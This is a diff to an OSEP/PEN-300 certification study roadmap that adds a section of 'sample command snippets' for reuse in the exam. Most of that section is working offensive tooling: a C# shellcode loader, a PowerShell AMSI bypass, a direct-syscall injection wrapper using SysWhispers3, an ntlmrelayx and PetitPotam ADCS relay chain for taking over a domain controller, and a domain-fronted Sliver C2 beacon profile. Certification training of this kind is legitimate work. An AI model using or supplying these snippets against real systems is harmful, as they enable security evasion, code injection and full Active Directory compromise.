@@ -116,6 +116,70 @@ aliases: [osep-prep-roadmap, pen-300-roadmap]
 - Cybernetics Pro Labs (HTB) — AD-heavy practice.
 - DEFCON 27 offensive C# workshop (mvelazc0) — free, eight short labs covering P/Invoke, custom Meterpreter stagers, raw shellcode injection, XOR/AES obfuscation, PowerShell-without-`powershell.exe`, classic DLL injection, process hollowing, parent-PID spoofing. A very efficient way to compress the early C# loader weeks.
 
+## Sample command snippets — the ones you will re-type all course long
+
+A minimal C# loader skeleton (weeks 2-6) that you iterate on weekly:
+
+```csharp
+// loader.cs — compile with: csc /platform:x64 /unsafe loader.cs
+using System;
+using System.Runtime.InteropServices;
+class L {
+    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
+    [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,IntPtr i);
+    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h,uint m);
+    static void Main(){
+        byte[] sc = new byte[]{ /* msfvenom -p windows/x64/exec CMD=calc.exe -f csharp */ };
+        IntPtr m = VirtualAlloc(IntPtr.Zero,(uint)sc.Length,0x3000,0x40); // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
+        Marshal.Copy(sc,0,m,sc.Length);
+        IntPtr t = CreateThread(IntPtr.Zero,0,m,IntPtr.Zero,0,IntPtr.Zero);
+        WaitForSingleObject(t,0xFFFFFFFF);
+    }
+}
+```
+
+AMSI memory patch (week 3) — drop in before any `IEX` or .NET assembly load:
+
+```powershell
+$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$f = $a.GetField('amsiInitFailed','NonPublic,Static')
+$f.SetValue($null, $true)
+```
+
+NtAlloc + NtWrite + NtCreateThreadEx via SysWhispers3 (week 6) — the stubs you generate become a `syscalls.asm` you link in. The C wrapper looks like:
+
+```c
+NTSTATUS status;
+PVOID base = NULL;
+SIZE_T sz = SHELLCODE_LEN;
+status = SW3_NtAllocateVirtualMemory(NtCurrentProcess(),&base,0,&sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+SW3_NtWriteVirtualMemory(NtCurrentProcess(),base,shellcode,SHELLCODE_LEN,NULL);
+ULONG oldProtect;
+SW3_NtProtectVirtualMemory(NtCurrentProcess(),&base,&sz,PAGE_EXECUTE_READ,&oldProtect);
+HANDLE hT;
+SW3_NtCreateThreadEx(&hT,GENERIC_EXECUTE,NULL,NtCurrentProcess(),base,NULL,FALSE,0,0,0,NULL);
+```
+
+ntlmrelayx coercion + ADCS ESC8 chain (week 9 networking + week 14 AD) — the cheat sheet to paste:
+
+```bash
+# Terminal 1 — relay handler aimed at vulnerable CA
+impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
+
+# Terminal 2 — coerce DC$ over PetitPotam (or DFSCoerce / PrinterBug)
+PetitPotam.py -u user -p pass -d corp.local attacker-ip dc01.corp.local
+
+# Result: PFX + key for DC01$ — kerberos UnPAC for NT hash, then DCSync.
+```
+
+Sliver beacon profile snippet (week 9) — domain-fronted via Cloudflare Workers:
+
+```text
+profiles new --mtls --domains worker-front.example.workers.dev,backend.example.com beacon-prod
+```
+
+Reuse these instead of typing from memory in the exam.
+
 ## Pragmatic notes from people who sat the exam
 - **C2 pairing:** carry two C2s. Most candidates' default is Sliver as primary (faster .NET assembly execution, smaller stagers) with Metasploit kept hot as a backup for token-handling and staging reliability. Chisel covers tunnelling for both.
 - **Recon discipline:** budget tool-time. After initial access, automated enumeration tends to plateau within 30–60 minutes; switch to manual file/registry/SQL exploration when that happens instead of grinding the same scripts.
